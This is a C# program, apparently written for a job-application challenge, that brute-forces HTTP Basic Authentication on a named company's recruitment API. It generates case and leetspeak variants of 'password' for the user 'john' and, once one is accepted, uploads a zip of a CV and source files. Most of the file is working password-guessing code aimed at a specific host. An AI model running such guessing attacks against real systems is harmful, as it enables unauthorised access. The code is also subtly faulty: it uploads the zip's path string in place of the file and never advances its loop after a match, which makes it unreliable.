using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;

namespace PasswordAPIAssessment
{
	class Program
	{
		/*
		 * Programmer  : Thulani Nyama
		 * Class Name  : Program
		 * Purpose     : This class represents a Program that launches an attack
		 *				 on Warp Development's authentication REST API, using an
		 *				 API call that utilizes Basic Authentication to submit a CV
		 *				 of Thulani Nyama a prospective employee of W@RP Development.
		 */

		static void Main()
		{
			/*
			// Method Name : method void Main()
			// Purpose     : entry point of the program 
			// Re-use      : none
			// Input       : none
			// Output      : .exe file displaying status of the program
			*/
			try
			{
				// Envoke Attack() to launch an attack on the authentication URL
				Attack();
			}
			catch (Exception e)
			{
				Console.WriteLine("Program error: " + e);
				Console.ReadKey();
			}
		}

		static void Attack()
		{
			/*
			// Method Name : method void Attack()
			// Purpose     : intiates an attack on the Warp's Server 
			// Re-use      : none
			// Input       : none
			// Output      : none
			*/

			// Envoke GenerateDict() to generate permutations of "password"
			GenerateDict();
			// Open stream reader and read from dict.txt file
			StreamReader sR = new StreamReader("../../../dict.txt");
			string scheme = "Basic", user = "john", pwd = sR.ReadLine();
			string status = "http://recruitment.warpdevelopment.co.za/api/upload/4324scs2345fdsdf14265t354wef25432451455tfacagfwrgh/", res;

			try
			{
				// loop while password permutation did not authenticate
				while (pwd != null)
				{
					// Envoke LaunchAttack() to authenticate user
					res = LaunchAttack(scheme, user, pwd);
					// If res equal status envoke UploadDocs()
					if (res == status)
					{
						// Envoke UploadDocs() to upload zip file
						Console.ReadKey();
						UpLoadDocs(status);
					}
					else
					{
						//Get next line of the permutation
						pwd = sR.ReadLine();
					}
					Console.WriteLine(res);
				}
			}
			catch (Exception e)
			{
				Console.WriteLine("Attack error: " + e);
				Console.ReadKey();
			}
			finally
			{
				// Close stream to dict.txt
				sR.Close();
			}
		}

		static void GenerateDict()
		{
			/*
			// Method Name : method void GenerateDict()
			// Purpose     : Generates and writes permutations of "password" 
			// Re-use      : none
			// Input       : none
			// Output      : .txt file containing permutions of "password"
			*/

			List<string> permutations = Permute("password");
			// Open stream writer and create dict.txt file
			StreamWriter sW = new StreamWriter("../../../dict.txt");

			try
			{
				for (int i = 0; i < permutations.Count; i++)
				{
					// write permutations to stream
					sW.WriteLine(permutations.ElementAt(i));
				}
			}
			catch (Exception e)
			{
				Console.WriteLine("Generate dictionary error: " + e);
			}
			finally
			{
				// Close write stream to dict.txt
				sW.Close();
			}
		}

		static string LaunchAttack(string authScheme, string userName, string userPwd)
		{
			/*
			// Method Name : method void LaunchAttack()
			// Purpose     : Launches an attack to authenticate user 
			// Re-use      : yes, while respond status is != HTTP/1.1 200 OK
			// Input       : none
			// Output      : response body containing URL to upload CV, a
			//				 "Not Authorized" status if not authorized
			*/

			// Declare read-only response value variable
			string resValue = string.Empty;
			// Declare authentication URL
			string endPoint = "http://recruitment.warpdevelopment.co.za/api/authenticate";

			HttpWebRequest req = (HttpWebRequest)WebRequest.Create(endPoint);
			// Set request Method
			req.Method = "GET";
			string authURL = Convert.ToBase64String(Encoding.ASCII.GetBytes(userName + ":" + userPwd));
			req.Headers.Add("Authorization", authScheme + " " + authURL);
			HttpWebResponse res = null;

			try
			{
				res = (HttpWebResponse)req.GetResponse();
				using (Stream resStream = res.GetResponseStream())
				{
					if (resStream != null)
					{
						using (StreamReader reader = new StreamReader(resStream))
						{
							// read Json response message
							resValue = reader.ReadToEnd();
						}
					}
				}
			}
			catch (Exception e)
			{
				Console.WriteLine("Launch Attack error: " + e);
			}
			finally
			{
				if (res != null)
				{
					((IDisposable)res).Dispose();
				}
			}
			// return upload URL
			return resValue;
		}

		async static void UpLoadDocs(string resURL)
		{
			/*
			// Method Name : method void UpLoadDocs()
			// Purpose     : zips and uploades zipped file containing
			//				 CV, dict.txt and Program.cs files to Warp's server 
			// Re-use      : none
			// Input       : none
			// Output      : writes a response of the upload status to the console
			*/

			byte[] fileBytes;
			// Create zipped file
			string[] paths = { @"../../../tNyama.pdf", @"../../../dict.txt", @"../../../Program.cs" };
			// Envoke Zipper() to zip the files
			string zippedFiles = Zipper(paths);
			// Get bytes of the zipped file
			fileBytes = Encoding.UTF8.GetBytes(zippedFiles);
			// Convert the bytes of the zipped file to a Base64 string
			var encodedZip = "Data:" + Convert.ToBase64String(fileBytes);

			IEnumerable<KeyValuePair<string, string>> req = new List<KeyValuePair<string, string>>()
			{
				new KeyValuePair<string, string>("post", encodedZip)
			};

			HttpContent q = new FormUrlEncodedContent(req);
			using (HttpClient client = new HttpClient())
			{
				using (HttpResponseMessage res = await client.PostAsync(resURL, q))
				{
					using (HttpContent content = res.Content)
					{
						HttpContentHeaders url = content.Headers;
						Console.WriteLine("Thulani's CV successfully uploaded\n", url);
						Console.ReadKey();
					}
				}
			}
		}

		static string Zipper(string[] paths)
		{
			/*
			 // Method Name : method void Zipper()
			 // Purpose     : generates a zipped file  to contain CV,
			 //				 dict.txt and Program.cs files 
			 // Re-use      : none
			 // Input       : none
			 // Output      : returns a path of the zipped file
			*/

			// Declare path of the zipped file
			string zippedFiles = @"../../../zippedDocs.zip";
			try
			{
				// loop through files to be zipped
				for (int i = 0; i < paths.Length; i++)
				{
					// update zipped file contents
					using (var zipped = ZipFile.Open(zippedFiles, ZipArchiveMode.Update))
					{
						// zip specified file
						zipped.CreateEntryFromFile(paths[i], Path.GetFileName(paths[i]));
					}
				}
			}
			catch (Exception e)
			{
				Console.WriteLine("Zipper error: " + e);
			}
			// return path of zipped file
			return zippedFiles;
		}

		static List<string> Permute(string pwd)
		{
			var permutations = new List<string>();

			permutations.Add(pwd);
			int n = pwd.Length;

			// Number of permutations is 2^n 
			int max = 1 << n;

			for (int i = 0; i < pwd.Length; i++)
			{
				char[] tmp = pwd.ToArray();
				if (tmp[i] == 'o')
				{
					tmp[i] = '0';
					permutations.Add(new string(tmp));
					permutations = permutations.Concat(Permute(new string(tmp))).ToList();
				}

				if (tmp[i] == 'a')
				{
					tmp[i] = '@';
					permutations.Add(new string(tmp));
					permutations = permutations.Concat(Permute(new string(tmp))).ToList();
				}

				if (tmp[i] == 's')
				{
					tmp[i] = '5';
					permutations.Add(new string(tmp));
					permutations = permutations.Concat(Permute(new string(tmp))).ToList();
				}
			}

			for (int i = 0; i < max; i++)
			{
				char[] combination = pwd.ToCharArray();

				// If j-th bit is set, 
				// convert it to upper case 
				for (int j = 0; j < n; j++)
				{
					if (((i >> j) & 1) == 1)
						combination[j] = (char)(combination[j] - 32);

					//if (((i >> j) & 1) == 2)
					//    combination[j] = (char)(combination[j] - 32);
				}
				string tmp = new string(combination);

				bool add = true;

				foreach (char c in combination)
				{
					if (((c) == 32) || (c) == 16 || (c) == 21) //add 0 and 5
					{
						//dont add
						add = false;
						//break on first instance
						break;
					}
					else
					{
						add = true;
					}
				}
				if (add) permutations.Add(tmp);
			}
			return permutations;
		}
	}
}